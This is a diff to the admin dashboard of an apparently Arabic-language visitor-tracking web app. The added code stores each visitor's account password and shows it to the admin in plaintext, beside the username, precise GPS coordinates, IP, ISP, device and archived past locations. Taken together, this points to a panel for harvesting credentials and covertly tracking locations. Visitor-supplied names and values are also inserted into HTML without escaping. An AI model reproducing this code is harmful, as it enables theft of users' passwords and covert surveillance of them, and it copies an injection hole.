@@ -895,12 +895,30 @@
       } catch (e) {}
     }
 
+    function extractShortAdminDeviceTitle(rawDevice = '') {
+      const cleaned = cleanAdminDevice(rawDevice).replace(/^[📱💻]\s*/, '').trim();
+      const firstPart = cleaned.split('•')[0].trim();
+      return firstPart.replace(/\(\d+x\d+\)/g, '').trim() || 'جهاز ذكي';
+    }
+
+    function getAdminDeviceIpKey(v) {
+      if (!v) return '';
+      if (v.deviceIpSignature) return v.deviceIpSignature;
+      const shortDev = extractShortAdminDeviceTitle(v.device || '')
+        .toLowerCase().replace(/[أإآ]/g, 'ا').replace(/ة/g, 'ه').replace(/ى/g, 'ي').replace(/\s+/g, ' ');
+      const ipStr = String(v.ip || '').trim();
+      if (!shortDev && !ipStr) return '';
+      return `devip:${shortDev}_${ipStr}`;
+    }
+
     function normVisitorKey(v) {
       if (!v) return '';
-      const rawName = String(v.visitorName || '').trim().toLowerCase()
-        .replace(/[أإآ]/g, 'ا').replace(/ة/g, 'ه').replace(/ى/g, 'ي');
-      const isGeneric = !rawName || rawName === 'زائر غير مسمي' || rawName === 'زائر مباشر' || rawName === 'مستخدم التطبيق' || rawName === 'زائر';
-      return !isGeneric ? `name:${rawName}` : `id:${v.id}`;
+      const rawName = String(v.username || v.visitorName || '').trim().toLowerCase()
+        .replace(/^@+/, '').replace(/[أإآ]/g, 'ا').replace(/ة/g, 'ه').replace(/ى/g, 'ي');
+      const isGeneric = !rawName || rawName === 'زائر غير مسمي' || rawName === 'زائر مباشر' || rawName === 'مستخدم التطبيق' || rawName === 'زائر' || rawName.includes('•') || Boolean(v.isDeviceIpAutoAuth);
+      if (!isGeneric) return `name:${rawName}`;
+      const devIpKey = getAdminDeviceIpKey(v);
+      return devIpKey || `id:${v.id}`;
     }
 
     function cleanAdminIsp(rawIsp = '', country = 'اليمن', ip = '') {
@@ -958,13 +976,22 @@
       for (const item of sorted) {
         if (!item || !item.id) continue;
         const resolvedIp = !isLoopbackAdminIp(item.ip) ? item.ip : (firstRealIp || item.ip);
+        const cleanedDevice = cleanAdminDevice(item.device);
+        const rawVName = String(item.visitorName || '').trim();
+        const isGenericVName = !rawVName || rawVName === 'زائر غير مسمى' || rawVName === 'زائر مباشر' || rawVName === 'مستخدم التطبيق' || rawVName === 'زائر';
+        const shortDevTitle = extractShortAdminDeviceTitle(cleanedDevice);
+        const autoDisplayName = isGenericVName ? `${shortDevTitle} • ${resolvedIp}` : rawVName;
         const cleanedItem = {
           ...item,
+          visitorName: autoDisplayName,
+          username: item.username || (!isGenericVName && !rawVName.includes('•') ? rawVName : ''),
+          accountPassword: item.accountPassword || '',
+          isDeviceIpAutoAuth: Boolean(item.isDeviceIpAutoAuth || isGenericVName || rawVName.includes('•')),
           ip: resolvedIp,
           localIp: item.localIp || '',
           asn: item.asn || '',
           isp: cleanAdminIsp(item.isp, item.country, resolvedIp),
-          device: cleanAdminDevice(item.device)
+          device: cleanedDevice
         };
         const key = normVisitorKey(cleanedItem);
         if (!map.has(key)) {
@@ -987,6 +1014,12 @@
           });
         } else {
           const primary = map.get(key);
+          if (!primary.accountPassword && cleanedItem.accountPassword) {
+            primary.accountPassword = cleanedItem.accountPassword;
+          }
+          if (!primary.username && cleanedItem.username) {
+            primary.username = cleanedItem.username;
+          }
           if (isLoopbackAdminIp(primary.ip) && !isLoopbackAdminIp(cleanedItem.ip)) {
             primary.ip = cleanedItem.ip;
           }
@@ -1393,6 +1426,21 @@
           </details>
         ` : `<span class="inline-block mt-1 text-[10px] text-slate-500">أول جلسة مسجلة</span>`;
 
+        const cleanUsername = String(v.username || '').trim().replace(/^@+/, '');
+        const cleanPass = String(v.accountPassword || '').trim();
+        const isAutoDeviceIp = Boolean(v.isDeviceIpAutoAuth && !cleanUsername);
+        const accountCredsHtml = isAutoDeviceIp
+          ? `<div class="mt-1 flex flex-wrap items-center gap-1">
+               <span class="px-2 py-0.5 rounded-lg bg-amber-500/15 border border-amber-500/30 text-amber-300 text-[10px] font-bold">📱 تعرّف تلقائي (اسم الهاتف + IP)</span>
+             </div>`
+          : `<div class="mt-1 flex flex-wrap items-center gap-1.5">
+               <span class="px-2 py-0.5 rounded-lg bg-fuchsia-500/15 border border-fuchsia-500/40 text-fuchsia-300 text-[11px] font-num font-bold" dir="ltr">@${cleanUsername || v.visitorName || 'user'}</span>
+               ${cleanPass
+                 ? `<span class="px-2 py-0.5 rounded-lg bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 text-[11px] font-num font-bold">🔑 الرمز: <strong class="text-white select-all">${cleanPass}</strong></span>`
+                 : `<span class="px-2 py-0.5 rounded-lg bg-slate-800 text-slate-400 text-[10px]">بدون رمز محفوظ</span>`
+               }
+             </div>`;
+
         return `
           <tr class="hover:bg-cyan-500/5 transition border-b border-slate-800/60 align-top">
             <td class="p-3 text-center">
@@ -1400,10 +1448,11 @@
             </td>
             <td class="p-3 text-slate-400 font-num font-bold">${idx + 1}</td>
             <td class="p-3">
-              <div class="font-bold text-white flex items-center gap-1.5">
+              <div class="font-bold text-white flex items-center gap-1.5 flex-wrap">
                 <span>${v.visitorName || 'زائر'}</span>
                 <span class="px-2 py-0.5 rounded-full bg-cyan-500/15 border border-cyan-500/30 text-cyan-300 text-[10px] font-num">تحديث #${v.loginCount || 1}</span>
               </div>
+              ${accountCredsHtml}
               ${archiveHtml}
             </td>
             <td class="p-3 font-num text-cyan-300 space-y-1">
@@ -1449,6 +1498,15 @@
       if (mobileCards) {
         mobileCards.innerHTML = visitors.map((v, idx) => {
           const prevLogs = Array.isArray(v.previousLogs) ? v.previousLogs : [];
+          const cleanUsername = String(v.username || '').trim().replace(/^@+/, '');
+          const cleanPass = String(v.accountPassword || '').trim();
+          const isAutoDeviceIp = Boolean(v.isDeviceIpAutoAuth && !cleanUsername);
+          const mobileCredsBadge = isAutoDeviceIp
+            ? `<div class="text-[11px] text-amber-300 font-bold">📱 تعرّف تلقائي: ${v.visitorName}</div>`
+            : `<div class="flex flex-wrap items-center gap-1.5 text-[11px]">
+                 <span class="px-2 py-0.5 rounded bg-fuchsia-500/20 text-fuchsia-300 font-num font-bold" dir="ltr">@${cleanUsername || v.visitorName}</span>
+                 ${cleanPass ? `<span class="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-num font-bold">🔑 الرمز: <strong class="text-white select-all">${cleanPass}</strong></span>` : ''}
+               </div>`;
           return `
             <div class="p-4 rounded-2xl bg-slate-900/90 border border-slate-700/80 space-y-2">
               <div class="flex items-center justify-between">
@@ -1462,7 +1520,9 @@
                   <button onclick="deleteSingleVisitor('${v.id}')" class="px-2 py-0.5 rounded bg-red-500/20 text-red-300 text-xs font-bold">حذف</button>
                 </div>
               </div>
+              ${mobileCredsBadge}
               <div class="text-xs text-emerald-400">📍 الموقع الحالي: ${v.city || 'صنعاء'} (${Number(v.lat).toFixed(5)}, ${Number(v.lng).toFixed(5)})</div>
+              <div class="text-[11px] text-slate-300">📱 ${v.device || 'هاتف ذكي'} • 🌐 ${v.isp || ''}</div>
               ${prevLogs.length > 0 ? `<div class="text-[11px] text-amber-300">📦 أرشيف الجلسات والمواقع السابقة المحفوظة: ${prevLogs.length}</div>` : ''}
               <button onclick="inspectVisitor(${idx})" class="w-full py-2 rounded-xl bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 text-xs font-bold">🎯 فحص بالرادار</button>
             </div>
